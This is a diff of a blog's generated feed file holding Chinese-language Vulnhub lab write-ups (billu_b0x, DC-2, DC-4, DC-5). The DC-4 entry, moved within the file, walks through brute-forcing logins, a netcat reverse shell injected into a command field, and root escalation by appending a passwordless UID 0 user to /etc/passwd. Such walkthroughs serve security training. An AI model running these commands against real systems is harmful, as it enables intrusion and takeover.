@@ -113,7 +113,7 @@
 <p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="/posts/827ecdf7/auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
 <h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="/posts/827ecdf7/login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
 <p>这里传马多次都没传成功，有时间再试试吧….</p>
-<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#56;&#x2e;&#49;&#52;&#52;">&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#56;&#x2e;&#49;&#52;&#52;</a>成功登录root用户</p>
+<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#x38;&#46;&#49;&#52;&#x34;">&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#x38;&#46;&#49;&#52;&#x34;</a>成功登录root用户</p>
 <p>Reference</p>
 <blockquote>
 <p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
@@ -435,7 +435,7 @@
 <br>
 
 <blockquote>
-<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#114;&#x6f;&#98;&#105;&#110;&#64;&#100;&#105;&#x67;&#105;&#x2e;&#110;&#105;&#x6e;&#106;&#x61;">&#114;&#x6f;&#98;&#105;&#110;&#64;&#100;&#105;&#x67;&#105;&#x2e;&#110;&#105;&#x6e;&#106;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
+<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#111;&#x62;&#x69;&#x6e;&#64;&#x64;&#105;&#103;&#x69;&#46;&#110;&#x69;&#110;&#106;&#x61;">&#x72;&#111;&#x62;&#x69;&#x6e;&#64;&#x64;&#105;&#103;&#x69;&#46;&#110;&#x69;&#110;&#106;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
 <p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
 </blockquote>
 <p>使用wpscan爆破</p>
@@ -714,177 +714,6 @@ $R=$Z('',$X);$R();
       </tags>
   </entry>
   <entry>
-    <title>DCchallenges4</title>
-    <url>/posts/d8125b4/</url>
-    <content><![CDATA[<ul>
-<li>环境</li>
-</ul>
-<blockquote>
-<p>网段 192.168.18.0/24<br>kali   192.168.18.131<br>靶机 192.168.18.135</p>
-</blockquote>
-<p>nmap扫描网段</p>
-<blockquote>
-<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:06 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00038s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.135<br>Host is up (0.00022s latency).<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00016s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds</p>
-</blockquote>
-<p>nmap扫描靶机开放的端口</p>
-<blockquote>
-<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.135 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:09 CST<br>Nmap scan report for 192.168.18.135<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    nginx 1.15.10<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</p>
-</blockquote>
-<p>dirsearch扫一下目录</p>
-<blockquote>
-<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.135 </p>
-<p>[11:14:19] Starting:<br>[11:14:25] 302 -  704B  - /command.php  -&gt;  index.php<br>[11:14:25] 301 -  170B  - /css  -&gt;  <a href="http://192.168.18.135/css/">http://192.168.18.135/css/</a><br>[11:14:26] 301 -  170B  - /images  -&gt;  <a href="http://192.168.18.135/images/">http://192.168.18.135/images/</a><br>[11:14:26] 403 -  556B  - /images/<br>[11:14:26] 200 -  506B  - /index.php<br>[11:14:27] 302 -  206B  - /login.php  -&gt;  index.php<br>[11:14:27] 302 -  163B  - /logout.php  -&gt;  index.php</p>
-</blockquote>
-<p>进主页看到一个登录框</p>
-<p><img src="/posts/d8125b4/index.png"></p>
-<p>burp爆破admin得到密码<code>happy</code></p>
-<p>登录后发现可以执行一些命令</p>
-<p><img src="/posts/d8125b4/command.png"><br>burp抓包看一下<br><img src="/posts/d8125b4/burp_whoami.png"><br><br><br><img src="/posts/d8125b4/burp_catpasswd.png"><br><br><br>反弹shell<br><img src="/posts/d8125b4/kali_nc.png"></p>
-<blockquote>
-<p>kali@kali2020:~$ nc -lvp 8888</p>
-</blockquote>
-<p>burp改包<br><img src="/posts/d8125b4/burp_nc.png"><br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run</p>
-<p>使用python得到交互式shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="/posts/d8125b4/shell.png"></p>
-<blockquote>
-<p>kali@kali2020:~$ nc -lvp 8888<br>listening on [any] 8888 …<br>192.168.18.135: inverse host lookup failed: Unknown host<br>connect to [192.168.18.131] from (UNKNOWN) [192.168.18.135] 48192<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’<br>www-data@dc-4:/usr/share/nginx/html$ whoami<br>whoami<br>www-data<br>www-data@dc-4:/usr/share/nginx/html$ </p>
-</blockquote>
-<p><code>cat /etc/passwd</code></p>
-<p>发现有三个用户</p>
-<blockquote>
-<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
-</blockquote>
-<p>看下charles用户有什么</p>
-<blockquote>
-<p>**www-data@dc-4:/home$ cd charles **</p>
-<p>cd charles<br><strong>www-data@dc-4:/home/charles$ ls</strong><br>ls<br><strong>www-data@dc-4:/home/charles$ ls -l</strong><br>ls -l<br>total 0<br><strong>www-data@dc-4:/home/charles$ cd ls</strong><br>cd ls<br>bash: cd: ls: No such file or directory<br><strong>www-data@dc-4:/home/charles$ cat ls</strong><br>cat ls<br>cat: ls: No such file or directory<br>**www-data@dc-4:/home/charles$ **</p>
-</blockquote>
-<p>查看jim用户有什么,mbox没权限访问</p>
-<blockquote>
-<p>**www-data@dc-4:~$ cd /home/jim  **<br>cd /home/jim<br><strong>www-data@dc-4:/home/jim$ ls</strong><br>ls<br>backups  mbox  test.sh</p>
-<p><strong>www-data@dc-4:/home/jim$ cat mbox</strong><br>cat mbox<br>cat: mbox: Permission denied<br>**www-data@dc-4:/home/jim$ **<br><strong>www-data@dc-4:/home/jim$ cd backups</strong><br>cd backups<br><strong>www-data@dc-4:/home/jim/backups$ ls</strong><br>ls<br>old-passwords.bak<br><strong>www-data@dc-4:/home/jim/backups$ cat old-passwords.bak</strong><br>cat old-passwords.bak</p>
-<p>… … </p>
-</blockquote>
-<p>把密码保存在dc4_passwd.txt</p>
-<blockquote>
-<p>kali@kali2020:~/Tools$ sudo hydra -l jim -P ~/Tools/dc4_passwd.txt ssh://192.168.18.135</p>
-<p>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</p>
-<p>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2021-05-02 22:25:29<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task<br>[DATA] attacking ssh://192.168.18.135:22/<br>[STATUS] 181.00 tries/min, 181 tries in 00:01h, 77 to do in 00:01h, 16 active</p>
-<p>[22][ssh] host: 192.168.18.135   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) finished at 2021-05-02 22:27:02</p>
-</blockquote>
-<p>得到 <code>jim  jibril04</code></p>
-<p>连接ssh</p>
-<blockquote>
-<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#x6a;&#105;&#109;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#x31;&#x38;&#46;&#49;&#x33;&#53;">&#x6a;&#105;&#109;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#x31;&#x38;&#46;&#49;&#x33;&#53;</a></strong></p>
-<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#x69;&#x6d;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#x2e;&#49;&#51;&#x35;">&#106;&#x69;&#x6d;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#x2e;&#49;&#51;&#x35;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
-<p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
-<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
-<p><strong>jim@dc-4:~$ pwd</strong></p>
-<p>/home/jim</p>
-<p>##看看有什么可以使用的root权限命令</p>
-<p><strong>jim@dc-4:~$ sudo -l</strong></p>
-<p>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#1) Respect the privacy of others.</span><br><span class="line">#2) Think before you type.</span><br><span class="line">#3) With great power comes great responsibility.</span><br></pre></td></tr></table></figure>
-
-<p>[sudo] password for jim:<br>Sorry, try again.<br>[sudo] password for jim:<br>Sorry, user jim may not run sudo on dc-4.<br>**jim@dc-4:~$ **</p>
-<p><strong>jim@dc-4:~$ ls -l</strong><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw——- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><strong>jim@dc-4:~$ cat mbox</strong></p>
-<p>From root@dc-4 Sat Apr 06 20:20:04 2019<br>Return-path: &lt;root@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000<br>Received: from root by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;root@dc-4&gt;)<br>        id 1hCiQe-0000gc-EC<br>        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000<br>To: jim@dc-4<br>Subject: Test<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;<br>From: root &lt;root@dc-4&gt;<br>Date: Sat, 06 Apr 2019 20:20:04 +1000<br>Status: RO</p>
-<p>This is a test.</p>
-</blockquote>
-<p>可以看到jim发了一条电子邮件</p>
-<p>去看一下./var/mail</p>
-<blockquote>
-<p><strong>jim@dc-4:~$ cd /var/mail</strong><br><strong>jim@dc-4:/var/mail$ ls</strong><br>jim<br><strong>jim@dc-4:/var/mail$ cd jim</strong><br>-bash: cd: jim: Not a directory<br><strong>jim@dc-4:/var/mail$ cat jim</strong><br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O</p>
-<p>Hi Jim,</p>
-<p>I’m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</p>
-<p>Password is:  <strong>^xHhA&amp;hvim0y</strong></p>
-<p>See ya,<br>Charles</p>
-<p>**jim@dc-4:/var/mail$ **</p>
-</blockquote>
-<p>发现了Charles的密码<code>^xHhA&amp;hvim0y</code></p>
-<p>su看看能否切换到charles</p>
-<blockquote>
-<p><strong>jim@dc-4:~$ su charles</strong></p>
-<p>Password:<br>**charles@dc-4:/home/jim$ **</p>
-</blockquote>
-<p>看看Charles有什么可以使用的root命令</p>
-<blockquote>
-<p><strong>charles@dc-4:~$ sudo -l</strong><br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-<p>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br>**charles@dc-4:~$ **</p>
-</blockquote>
-<p>发现可以不使用密码就能执行<code>teehee</code></p>
-<p>搜了一下 可以利用<code>teehee</code>进行提权</p>
-<blockquote>
-<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
-</blockquote>
-<p><img src="/posts/d8125b4/teeheeuser.png"></p>
-<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
-<p>七个字段</p>
-<p>root:x:0:0:root:/root:/bin/bash</p>
-<p>Mamor:x:0:0:::/bin/bash</p>
-<p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
-<blockquote>
-<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#x4d;&#x61;&#x6d;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#x31;&#x38;&#46;&#x31;&#x33;&#x35;">&#x4d;&#x61;&#x6d;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#x31;&#x38;&#46;&#x31;&#x33;&#x35;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#x61;&#109;&#x6f;&#114;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x31;&#56;&#x2e;&#x31;&#x33;&#x35;">&#77;&#x61;&#109;&#x6f;&#114;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x31;&#56;&#x2e;&#x31;&#x33;&#x35;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#x4d;&#97;&#109;&#x6f;&#114;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#56;&#x2e;&#49;&#51;&#53;">&#x4d;&#97;&#109;&#x6f;&#114;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#56;&#x2e;&#49;&#51;&#53;</a>‘s password: </p>
-<p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
-</blockquote>
-<p>构造失败，重新构造一个</p>
-<blockquote>
-<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
-<p>………….</p>
-<p>Mamor111::0:0:::/bin/bash</p>
-<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
-<p>Mamor111::0:0:::/bin/bash<br><strong>charles@dc-4:~$ su Mamor111</strong></p>
-<p><strong>root@dc-4:/home/charles# ls</strong><br><strong>root@dc-4:/home/charles# cd ../</strong><br><strong>root@dc-4:/home# ls</strong><br>charles  jim  sam<br><strong>root@dc-4:/home# cd ../</strong><br><strong>root@dc-4:/# ls</strong><br>bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz<br>boot  home        lib             mnt    root  srv   usr  vmlinuz.old<br>dev   initrd.img  lost+found      opt    run   sys   var<br><strong>root@dc-4:/# cd root</strong><br><strong>root@dc-4:/root# ls</strong><br>flag.txt<br><strong>root@dc-4:/root# cat flag.txt</strong></p>
-<p>888       888          888 888      8888888b.                             888 888 888 888<br>888   o   888          888 888      888  “Y88b                            888 888 888 888<br>888  d8b  888          888 888      888    888                            888 888 888 888<br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888<br>888d88888b888 d8P  Y8b 888 888      888    888 d88””88b 888 “88b d8P  Y8b 888 888 888 888<br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P<br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      “   “   “   “<br>888P     Y888  “Y8888  888 888      8888888P”   “Y88P”  888  888  “Y8888  888 888 888 888 </p>
-<p>Congratulations!!!</p>
-<p>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.</p>
-<p>If you enjoyed this CTF, send me a tweet via @DCAU7.<br>**root@dc-4:/root# **</p>
-</blockquote>
-<br>
-<br>
-
-<p>总结</p>
-<ul>
-<li>nmap扫网段，靶机端口</li>
-<li>dirsearch扫目录</li>
-<li>burpsuite爆破后台</li>
-<li>进入后台发现能执行部分命令并抓包修改发现能命令执行</li>
-<li>反弹shell<blockquote>
-<p>反弹shell<br>kali@kali2020:~$ nc -lvp 8888<br>burp改包<br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run<br>使用python得到交互式shell<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
-</blockquote>
-</li>
-<li>cat /etc/passwd 发现三个用户，并查看信息</li>
-<li>ssh用户爆破</li>
-<li><strong>teehee提权</strong><blockquote>
-<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
-</blockquote>
-</li>
-<li>创建管理员身份并切换</li>
-<li>得到flag</li>
-</ul>
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<p>Reference</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p>
-<p><a href="https://www.pianshen.com/article/9999990100/">https://www.pianshen.com/article/9999990100/</a></p>
-<p><a href="https://blog.csdn.net/Nicky_Zheng/article/details/113173929">https://blog.csdn.net/Nicky_Zheng/article/details/113173929</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>DCchallenges</category>
-      </categories>
-      <tags>
-        <tag>DCchallenges</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DCchallenges5</title>
     <url>/posts/7a861522/</url>
     <content><![CDATA[<p>环境</p>
@@ -947,6 +776,177 @@ $R=$Z('',$X);$R();
 <br>
 
 <p>把三个文件通过蚁剑传到靶机中<br><img src="/posts/7a861522/upload.png"><br><img src="/posts/7a861522/exp.png"><br><img src="/posts/7a861522/flag.png"></p>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DCchallenges4</title>
+    <url>/posts/d8125b4/</url>
+    <content><![CDATA[<ul>
+<li>环境</li>
+</ul>
+<blockquote>
+<p>网段 192.168.18.0/24<br>kali   192.168.18.131<br>靶机 192.168.18.135</p>
+</blockquote>
+<p>nmap扫描网段</p>
+<blockquote>
+<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:06 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00038s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.135<br>Host is up (0.00022s latency).<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00016s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds</p>
+</blockquote>
+<p>nmap扫描靶机开放的端口</p>
+<blockquote>
+<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.135 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:09 CST<br>Nmap scan report for 192.168.18.135<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    nginx 1.15.10<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</p>
+</blockquote>
+<p>dirsearch扫一下目录</p>
+<blockquote>
+<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.135 </p>
+<p>[11:14:19] Starting:<br>[11:14:25] 302 -  704B  - /command.php  -&gt;  index.php<br>[11:14:25] 301 -  170B  - /css  -&gt;  <a href="http://192.168.18.135/css/">http://192.168.18.135/css/</a><br>[11:14:26] 301 -  170B  - /images  -&gt;  <a href="http://192.168.18.135/images/">http://192.168.18.135/images/</a><br>[11:14:26] 403 -  556B  - /images/<br>[11:14:26] 200 -  506B  - /index.php<br>[11:14:27] 302 -  206B  - /login.php  -&gt;  index.php<br>[11:14:27] 302 -  163B  - /logout.php  -&gt;  index.php</p>
+</blockquote>
+<p>进主页看到一个登录框</p>
+<p><img src="/posts/d8125b4/index.png"></p>
+<p>burp爆破admin得到密码<code>happy</code></p>
+<p>登录后发现可以执行一些命令</p>
+<p><img src="/posts/d8125b4/command.png"><br>burp抓包看一下<br><img src="/posts/d8125b4/burp_whoami.png"><br><br><br><img src="/posts/d8125b4/burp_catpasswd.png"><br><br><br>反弹shell<br><img src="/posts/d8125b4/kali_nc.png"></p>
+<blockquote>
+<p>kali@kali2020:~$ nc -lvp 8888</p>
+</blockquote>
+<p>burp改包<br><img src="/posts/d8125b4/burp_nc.png"><br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run</p>
+<p>使用python得到交互式shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="/posts/d8125b4/shell.png"></p>
+<blockquote>
+<p>kali@kali2020:~$ nc -lvp 8888<br>listening on [any] 8888 …<br>192.168.18.135: inverse host lookup failed: Unknown host<br>connect to [192.168.18.131] from (UNKNOWN) [192.168.18.135] 48192<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’<br>www-data@dc-4:/usr/share/nginx/html$ whoami<br>whoami<br>www-data<br>www-data@dc-4:/usr/share/nginx/html$ </p>
+</blockquote>
+<p><code>cat /etc/passwd</code></p>
+<p>发现有三个用户</p>
+<blockquote>
+<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
+</blockquote>
+<p>看下charles用户有什么</p>
+<blockquote>
+<p>**www-data@dc-4:/home$ cd charles **</p>
+<p>cd charles<br><strong>www-data@dc-4:/home/charles$ ls</strong><br>ls<br><strong>www-data@dc-4:/home/charles$ ls -l</strong><br>ls -l<br>total 0<br><strong>www-data@dc-4:/home/charles$ cd ls</strong><br>cd ls<br>bash: cd: ls: No such file or directory<br><strong>www-data@dc-4:/home/charles$ cat ls</strong><br>cat ls<br>cat: ls: No such file or directory<br>**www-data@dc-4:/home/charles$ **</p>
+</blockquote>
+<p>查看jim用户有什么,mbox没权限访问</p>
+<blockquote>
+<p>**www-data@dc-4:~$ cd /home/jim  **<br>cd /home/jim<br><strong>www-data@dc-4:/home/jim$ ls</strong><br>ls<br>backups  mbox  test.sh</p>
+<p><strong>www-data@dc-4:/home/jim$ cat mbox</strong><br>cat mbox<br>cat: mbox: Permission denied<br>**www-data@dc-4:/home/jim$ **<br><strong>www-data@dc-4:/home/jim$ cd backups</strong><br>cd backups<br><strong>www-data@dc-4:/home/jim/backups$ ls</strong><br>ls<br>old-passwords.bak<br><strong>www-data@dc-4:/home/jim/backups$ cat old-passwords.bak</strong><br>cat old-passwords.bak</p>
+<p>… … </p>
+</blockquote>
+<p>把密码保存在dc4_passwd.txt</p>
+<blockquote>
+<p>kali@kali2020:~/Tools$ sudo hydra -l jim -P ~/Tools/dc4_passwd.txt ssh://192.168.18.135</p>
+<p>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</p>
